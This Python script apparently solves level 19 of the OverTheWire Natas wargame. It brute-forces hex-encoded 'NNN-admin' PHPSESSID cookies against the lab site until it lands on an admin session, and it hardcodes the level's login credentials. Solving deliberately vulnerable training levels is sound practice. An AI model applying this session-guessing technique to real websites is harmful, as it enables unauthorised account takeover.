#!/bin/python3

import base64
import requests
import binascii

user = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://natas19.natas.labs.overthewire.org"
search = "are an admin"

for i in range(641):
    if 10 > i:
        i = "00{0}".format(i)
    elif 100 > i:
        i = "0{0}".format(i)

    slug = "{0}-admin".format(i)

    session_id = base64.b16encode(slug.encode()).lower().decode()

    response = requests.get(
        url,
        auth=(user, password),
        cookies=dict(PHPSESSID=session_id)
    )

    print("{0} - {1}".format(slug, session_id))

    if search in response.text:
        print("")
        print(response.text)
        break
